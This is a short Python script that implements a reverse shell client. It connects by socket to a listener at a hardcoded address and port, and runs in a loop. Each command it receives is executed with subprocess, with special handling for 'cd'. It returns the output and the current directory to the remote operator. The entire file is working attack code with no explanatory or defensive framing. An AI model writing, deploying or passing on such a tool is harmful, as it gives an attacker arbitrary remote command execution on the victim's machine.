import socket
import subprocess
import os
sep = "<sep>"
bf_sz = 1024*256
s = socket.socket()
s.connect(("0.0.0.0",17000))
cwd = os.getcwd()
s.send(cwd.encode())
while True:
	cwd = os.getcwd()
	command = s.recv(bf_sz).decode()
	splited_command = command.split()
	output = subprocess.getoutput(command)
	if splited_command[0] == "cd":
		try:
			os.chdir(' '.join(splited_command[1:]))
		except FileNotFoundError as e:
			output = str(e)
		else:
			output = ""
	#else:
	#	output = subprocess.getoutput(command)
	answer = str(f"{output}{sep}{cwd}")
	s.send(answer.encode())
s.close()
